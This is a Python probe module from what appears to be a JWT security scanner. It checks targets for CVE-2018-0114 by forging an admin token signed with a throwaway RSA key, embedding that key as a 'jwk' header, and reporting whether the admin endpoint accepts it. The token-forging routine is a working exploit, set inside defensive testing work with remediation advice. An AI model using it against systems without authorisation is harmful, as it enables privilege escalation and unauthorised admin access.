"""P6: attacker-controlled JWK header injection (CVE-2018-0114).

Generates a fresh RSA keypair locally, signs a forged admin token with the
attacker's PRIVATE key, and embeds the matching PUBLIC key as a `jwk` object
inside the JWT header. A vulnerable library extracts the verification key from
the token header itself, so it verifies the attacker's signature against the
attacker's key and accepts the token.

    header = {"alg": "RS256", "typ": "JWT", "jwk": {"kty": "RSA", "n": ..., "e": ...}}

CONFIRMED only if a variant returns HTTP 200 AND the escalation gate passes. A
server that verifies against its own trusted key (ignoring the jwk header)
rejects the attacker-signed token, so the honest verdict there is NOT_VULNERABLE.

The keypair is ephemeral and generated with the `cryptography` library — no
external service is contacted. This probe forges a self-consistent signature
against a throwaway key, not the server's key, so it grants no ForgeCapability.
"""

from __future__ import annotations

import json
from typing import Any

import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa

from ..client import AuthClient, Baseline
from ..models import Evidence, Finding, ForgeCapability, Severity, Target, Verdict
from .base import Probe, register

_ADMIN_CLAIMS: dict[str, Any] = {"sub": "alice", "username": "alice", "role": "admin"}


class JwkInjectionProbe(Probe):
    id = "jwk_injection"
    title = "attacker-supplied JWK header injection (CVE-2018-0114)"
    severity = Severity.CRITICAL
    cwe = "CWE-347"
    cve = "CVE-2018-0114"
    remediation = (
        "Never use a public key embedded in the token header for verification. "
        "Always load the trusted public key from a server-side trusted source "
        "only. Reject any token containing a jwk, jku, or x5u header."
    )

    def run(
        self,
        client: AuthClient,
        target: Target,
        baseline: Baseline,
        capability: ForgeCapability,
    ) -> Finding:
        request_line = f"GET {target.admin_path}"
        forged = self._forge_jwk_token()
        resp = client.get(target.admin_path, forged)
        snippet = resp.text[:200]

        if client.is_escalated(resp, baseline):
            evidence = Evidence(
                forged_token=forged,
                request_line=request_line,
                status_code=resp.status_code,
                response_snippet=snippet,
                note="attacker JWK header trusted for verification; escalated to admin",
            )
            return self._finding(Verdict.CONFIRMED, evidence)

        evidence = Evidence(
            forged_token=forged,
            request_line=request_line,
            status_code=resp.status_code,
            response_snippet=snippet,
            note="embedded jwk header ignored; attacker-signed token rejected (expected)",
        )
        return self._finding(Verdict.NOT_VULNERABLE, evidence)

    @staticmethod
    def _forge_jwk_token() -> str:
        """Sign an admin token with a throwaway RSA key and embed its public JWK."""
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_jwk = json.loads(pyjwt.algorithms.RSAAlgorithm.to_jwk(private_key.public_key()))
        jwk_header = {"kty": "RSA", "n": public_jwk["n"], "e": public_jwk["e"]}
        return pyjwt.encode(
            _ADMIN_CLAIMS,
            private_key,
            algorithm="RS256",
            headers={"jwk": jwk_header},
        )

    def _finding(self, verdict: Verdict, evidence: Evidence) -> Finding:
        return Finding(
            probe_id=self.id,
            title=self.title,
            verdict=verdict,
            severity=self.severity,
            cwe=self.cwe,
            evidence=evidence,
            remediation=self.remediation,
        )


register(JwkInjectionProbe())
